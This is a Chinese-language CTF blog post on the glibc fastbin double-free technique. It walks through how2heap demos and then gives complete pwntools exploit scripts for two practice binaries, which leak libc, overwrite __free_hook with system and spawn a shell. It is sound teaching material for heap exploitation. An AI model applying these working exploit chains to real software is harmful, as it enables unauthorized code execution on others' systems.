---
title: 「PWN」HEAP - Fastbin - Double Free
description: 这篇博客文章由nova撰写，主要讨论了在PWN攻防中如何利用Fastbin的Double Free漏洞进行攻击。
pubDate: 2022-03-21
tags:
- CTF
- Pwn
authors:
- nova
---

Double Free 是 Fastbin 里比较容易的一个利用，搞一下

# 原理

整体原理比较简单，在[ctf-wiki](https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/fastbin-attack/#fastbin-double-free)上可以看到。主要就是因为 fastbin 在检查时只检查链表头部且释放时不清除`prev_in_use`

在中也有相应的源码

<!--truncate-->

# 测试

使用[how2heap](https://github.com/shellphish/how2heap)里的[fastbin_dup.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.31/fastbin_dup.c)和[fastbin_dup_into_stack.c](https://github.com/shellphish/how2heap/blob/master/glibc_2.23/fastbin_dup_into_stack.c)作为演示。

## fastbin_dup.c

为了方便，我们关闭 ASLR 的地址随机化

```sh
gcc -g -m64 -no-pie fastbin_dup.c -o fastbin_dup
```

这里它先填充了 tcache，以便接下来的操作在 fastbin 中进行。

![prefill of tcache](https://oss.nova.gal/img/image-20220321115447065.png)

直接把断点下在`line 20`，一步一步看他是怎么运行的

![image-20220321140323823](https://oss.nova.gal/img/image-20220321140323823.png)

首先`calloc`了三个`chunk`，并释放掉第一个`chunk`。可以看到第一个`a`已经进入了 fastbins

![image-20220321141109457](https://oss.nova.gal/img/image-20220321141109457.png)

此时如果我们再次释放`a`，程序会崩溃，因为 fastbin 的检测会检查头部是否和释放的这个`chunk`一致

bypass 的方法很简单，释放之前再释放一个别的 chunk 不就好了？直接跳到`line 40`来看

![image-20220321141752410](https://oss.nova.gal/img/image-20220321141752410.png)

现在的链表结构参考`ctf-wiki`![img](https://oss.nova.gal/img/fastbin_free_chunk3.png)

接下来我们再次`calloc`，由`alloc`的机制我们知道他会先从 fastbin 的头部去取。

![image-20220321142120620](https://oss.nova.gal/img/image-20220321142120620.png)

![image-20220321142135871](https://oss.nova.gal/img/image-20220321142135871.png)

![image-20220321142159911](https://oss.nova.gal/img/image-20220321142159911.png)

可以看到，`a`和`c`指向了同一个 chunk

## fastbin_dup_into_stack.c

为了方便，我们关闭 ASLR 并使用`glibc-2.23`作为动态解释器

```sh
gcc -g -m64 -no-pie fastbin_dup_into_stack.c -o fastbin_dup_into_stack
patchelf --set-rpath /home/nova/Desktop/CTF/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ --set-interpreter /home/nova/Desktop/CTF/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so fastbin_dup_into_stack
```

知道了 Double Free 的工作原理，怎么利用呢？这个文件给了我们答案。

类似于[fasbin_dup.c](#fastbin_dup.c)，它申请了 3 个`chunk`，这里我们不再赘述。直接跳到 34 行——也就是 Double Free 完成之后

重新申请一个 d，它拿去了`a`所表示的 chunk，此时`a`所表示的 chunk 是我们可控的 fastbin

注意这里

```c
	stack_var = 0x20;

	fprintf(stderr, "Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n", a);
	*d = (unsigned long long) (((char*)&stack_var) - sizeof(d));
```

这个 stack_var 设置成`0x20`是为了伪造一个`fake_chunk`，由于检查时要求大小要一致所以这样设置。

![image-20220321144456020](https://oss.nova.gal/img/image-20220321144456020.png)

```c
*d = (unsigned long long) (((char*)&stack_var) - sizeof(d));
```

这段话做了什么呢？

![image-20220321143928311](https://oss.nova.gal/img/image-20220321143928311.png)

它将`d`的`contents`修改为了`&stack_var-8`，可`d`代表的 chunk 实际上还在 fastbin 中，而 fastbin 中这个位置的数据代表着也正好代表着`fd`

![image-20220321144048053](https://oss.nova.gal/img/image-20220321144048053.png)

可以看到，链表上多出了一项，也就是`0x40500`的`fd`指针所指的位于栈上的地址。

接下来，我们只要再拿到这个 chunk，就可以进行任意写了。

# 实战

拿了两个最简单的模板题作为实验

## samsara

先做必要的准备

```sh
patchelf --set-rpath /home/nova/Desktop/CTF/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ --set-interpreter /home/nova/Desktop/CTF/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so samsara
```

![image-20220321150904705](https://oss.nova.gal/img/image-20220321150904705.png)

通过分析，我们可以知道几个功能的用途分别是`add`，`delete`，`edit`，值得注意的是，`delete`并不会修改`cnt`，也没有把指针置 0

还要关注的是`lair`和`kingdom`这两个选项，

观察可以发现，`lair`与`pwn`隔得很近

![image-20220321151231353](https://oss.nova.gal/img/image-20220321151231353.png)

我们能输出`lair`的地址，那么`pwn`的地址也自然可以获得了。

```python
from pwn import *

sh = process(["./samsara"])
context.log_level = 'DEBUG'
context.arch = 'amd64'
context.os = 'linux'


def add():
    sh.recvuntil(b"choice > ")
    sh.sendline(b"1")
    sh.recvuntil(b"Captured.\n")


def delete(idx: int):
    sh.recvuntil(b"choice > ")
    sh.sendline(b"2")
    sh.recvuntil(b"Index:\n")
    sh.sendline(str(idx).encode())
    sh.recvuntil(b"Eaten.\n")


def edit(idx: int, content: bytes):
    sh.recvuntil(b"choice > ")
    sh.sendline(b"3")
    sh.recvuntil(b"Index:\n")
    sh.sendline(str(idx).encode())
    sh.recvuntil(b"Ingredient:\n")
    sh.sendline(content)
    sh.recvuntil(b"Cooked.")


def lair() -> int:
    sh.recvuntil(b"choice > ")
    sh.sendline(b"4")
    sh.recvuntil(b"Your lair is at: ")
    lair_addr = int(sh.recvuntil(b'\n', drop=True), 16)
    return lair_addr


def kingdom(content: int):
    sh.recvuntil(b"choice > ")
    sh.sendline(b"5")
    sh.recvuntil(b"Which kingdom?\n")
    sh.sendline(str(content).encode())
    sh.recvuntil(b"Moved. \n")


def pwn():
    sh.recvuntil(b"choice > ")
    sh.sendline(b"6")
    sh.interactive()

```

先写好功能菜单，根据我们的想法，我们应该先申请 2 个 chunk，然后再删除 idx 为`0, 1, 0`的 chunk

![image-20220321152623422](https://oss.nova.gal/img/image-20220321152623422.png)

此时我们再次 add 一下，这个 chunk 的 fd 和 bk 指针就是可控的了。我们将其修改为`lair-0x08`，也就是`pwn-0x10`的位置——这样对这个 chunk 修改时，修改的地方正好是`pwn`的位置。并修改 lair 的值为`0x20`以 bypass 检查。

![image-20220321153500569](https://oss.nova.gal/img/image-20220321153500569.png)

此时我们拿到这个位于栈上的 chunk 并修改其值为`0xdeadbeef`即可拿到 shell

exp:

```python
from pwn import *

sh = process(["./samsara"])
context.log_level = 'DEBUG'
context.arch = 'amd64'
context.os = 'linux'


def add():
    sh.recvuntil(b"choice > ")
    sh.sendline(b"1")
    sh.recvuntil(b"Captured.\n")


def delete(idx: int):
    sh.recvuntil(b"choice > ")
    sh.sendline(b"2")
    sh.recvuntil(b"Index:\n")
    sh.sendline(str(idx).encode())
    sh.recvuntil(b"Eaten.\n")


def edit(idx: int, content: bytes):
    sh.recvuntil(b"choice > ")
    sh.sendline(b"3")
    sh.recvuntil(b"Index:\n")
    sh.sendline(str(idx).encode())
    sh.recvuntil(b"Ingredient:\n")
    sh.sendline(content)
    sh.recvuntil(b"Cooked.")


def lair() -> int:
    sh.recvuntil(b"choice > ")
    sh.sendline(b"4")
    sh.recvuntil(b"Your lair is at: ")
    lair_addr = int(sh.recvuntil(b'\n', drop=True), 16)
    return lair_addr


def kingdom(content: int):
    sh.recvuntil(b"choice > ")
    sh.sendline(b"5")
    sh.recvuntil(b"Which kingdom?\n")
    sh.sendline(str(content).encode())
    sh.recvuntil(b"Moved.\n")


def pwn():
    sh.recvuntil(b"choice > ")
    sh.sendline(b"6")
    sh.interactive()


add()  # 0
add()  # 1

delete(0)
delete(1)
delete(0)

add()  # 2
lair_chunk = lair() - 0x08
kingdom(0x20)
edit(2, str(lair_chunk).encode())
add()  # 3
add()  # 4
add()  # 5
edit(5, str(0xdeadbeef).encode())
pwn()

# gdb.attach(sh, 'b puts')
# sh.interactive()

```

## ACTF-2019_Message

稍微复杂一点。保护除了 ASLR 是全开的。

观察可以发现漏洞

在`delete`时程序释放时没有对指针进行置零，只对 size 位置零

![image-20220321160539186](https://oss.nova.gal/img/image-20220321160539186.png)

根据`show`和`edit`函数，我们如果能修改`array[4 * idx + 2]`的内容，那么也就可以做到任意地址读写。

也就是说，关键就在于如何在`array`上制造一个`fake chunk`

按之前的思路，我们如果`malloc 0, 1, 2`，并`delete 1, 2, 1`，再`malloc 3`，这个`3`的`content/fd`我们就可以指向`array`，此时，我们再多次`malloc`，就可以获得`fake chunk`

先写好菜单

```python
from pwn import *
from typing import TypeVar, Callable

T = TypeVar("T", bound=Callable)

sh = process(["./ACTF_2019_message"])
context.log_level = 'DEBUG'
context.arch = 'amd64'
context.os = 'linux'


def menu(idx: int):
    def inner(func: T) -> T:
        def wrapper(*arg, **kwargs):
            sh.recvuntil(b"choice: ")
            sh.sendline(str(idx).encode())
            return func(*arg, **kwargs)
        return wrapper
    return inner


@menu(1)
def add(lengths: int, content: bytes):
    sh.recvuntil(b"length of message:\n")
    sh.sendline(str(lengths).encode())
    sh.recvuntil(b"input the message:\n")
    sh.sendline(content)


@menu(2)
def delete(idx: int):
    sh.recvuntil(b"you want to delete:\n")
    sh.sendline(str(idx).encode())


@menu(3)
def edit(idx: int, content: bytes):
    sh.recvuntil(b"you want to edit:\n")
    sh.sendline(str(idx).encode())
    sh.recvuntil(b"edit the message:\n")
    sh.sendline(content)


@menu(4)
def show(idx: int) -> bytes:
    sh.recvuntil(b"you want to display:\n")
    sh.sendline(str(idx).encode())
    sh.recvuntil(b"The message: ")
    msg = sh.recvuntil(b"\n", drop=True)
    return msg

```

值得注意的是，由于`size`要相同，我们第 0 个 chunk 的大小应该比其他 chunk 大`0x10`

```python
add(0x20, b'aaaaaa')  # 0
add(0x10, b'aaaaaa')
add(0x10, b'aaaaaa')
delete(1)
delete(2)
delete(1)
add(0x10, p64(0x602060-0x08))  # 3
```

可以看到，我们在`0x602060-0x08`的地方构造了一个`fake_chunk`，如此一来，`0x602060`便可以作为`chunk_size`，而`0`的`chunk_addr`也就可以由`fake_chunk`修改，`chunk_addr`的内容也能由`0`来读

![image-20220321165333289](https://oss.nova.gal/img/image-20220321165333289.png)

```python
add(0x10, b'aaaaaa')  # 4
add(0x10, b'aaaaaa')  # 5
add(0x10, b'aaaaaa')  # 6 -> fake
```

![image-20220321165836827](https://oss.nova.gal/img/image-20220321165836827.png)

此时已经可以任意读任意写了，这时候，只需要搞出`libc_base`就可以了

```python
elf = ELF(r"./ACTF_2019_message")
libc = ELF(r"/home/nova/Desktop/CTF/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so")

add(0x10, p64(elf.got['puts']))  # 6 -> fake

puts_addr = u64(show(0).ljust(8, b'\x00'))
libc_base = puts_addr - libc.sym['puts']
print(hex(libc_base))
```

`libc_base`出来了，可是如何调用`system`还是困难的。因为保护是`FULL RELRO`，所以我们没办法改写`GOT表`，即使能改，因为我们没有办法传参，也没办法过去（除非我们找到 one-gadget 然后再想办法在栈上写）

这时候就可以使用包括`__malloc_hook()`和`__free_hook()`等一系列`libc`中自带的`hook`函数

其中属`__free_hook()`最好用，因为它的参数就是`chunk`本身

这样，我们只需要把`6`的`content`改为`__free_hook()`，并把`0`的`content`改为`system()`，便实现了篡改

![__free_hook()有write权限](https://oss.nova.gal/img/image-20220321173758716.png)

```python
system = libc_base + libc.sym['system']
free_hook = libc_base + libc.sym['__free_hook']
print(hex(free_hook))

edit(6, p64(free_hook))
edit(0, p64(system))
```

![image-20220321173952320](https://oss.nova.gal/img/image-20220321173952320.png)

接下来，新建一个内容为`/bin/sh`的 chunk 并释放就可以拿到 shell 了。

exp:

```python
from pwn import *
from typing import TypeVar, Callable

T = TypeVar("T", bound=Callable)

sh = process([r"./ACTF_2019_message"])
elf = ELF(r"./ACTF_2019_message")
libc = ELF(r"/home/nova/Desktop/CTF/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so")
context.log_level = 'DEBUG'
context.arch = 'amd64'
context.os = 'linux'


def menu(idx: int):
    def inner(func: T) -> T:
        def wrapper(*arg, **kwargs):
            sh.recvuntil(b"choice: ")
            sh.sendline(str(idx).encode())
            return func(*arg, **kwargs)
        return wrapper
    return inner


@menu(1)
def add(lengths: int, content: bytes):
    sh.recvuntil(b"length of message:\n")
    sh.sendline(str(lengths).encode())
    sh.recvuntil(b"input the message:\n")
    sh.sendline(content)


@menu(2)
def delete(idx: int):
    sh.recvuntil(b"you want to delete:\n")
    sh.sendline(str(idx).encode())


@menu(3)
def edit(idx: int, content: bytes):
    sh.recvuntil(b"you want to edit:\n")
    sh.sendline(str(idx).encode())
    sh.recvuntil(b"edit the message:\n")
    sh.sendline(content)


@menu(4)
def show(idx: int) -> bytes:
    sh.recvuntil(b"you want to display:\n")
    sh.sendline(str(idx).encode())
    sh.recvuntil(b"The message: ")
    msg = sh.recvuntil(b"\n", drop=True)
    return msg


def dbg(arg: str = ''):
    gdb.attach(sh, arg)
    pause()


add(0x20, b'aaaaaa')  # 0
add(0x10, b'aaaaaa')  # 1
add(0x10, b'aaaaaa')  # 2
delete(1)
delete(2)
delete(1)
add(0x10, p64(0x602060-0x08))  # 3

add(0x10, b'aaaaaa')  # 4
add(0x10, b'aaaaaa')  # 5
add(0x10, p64(elf.got['puts']))  # 6 -> fake_chunk

puts_addr = u64(show(0).ljust(8, b'\x00'))
libc_base = puts_addr - libc.sym['puts']

system = libc_base + libc.sym['system']
free_hook = libc_base + libc.sym['__free_hook']
print(hex(free_hook))

edit(6, p64(free_hook))
edit(0, p64(system))

add(0x20, b'/bin/sh\x00')  # 7
delete(7)

sh.interactive()
```
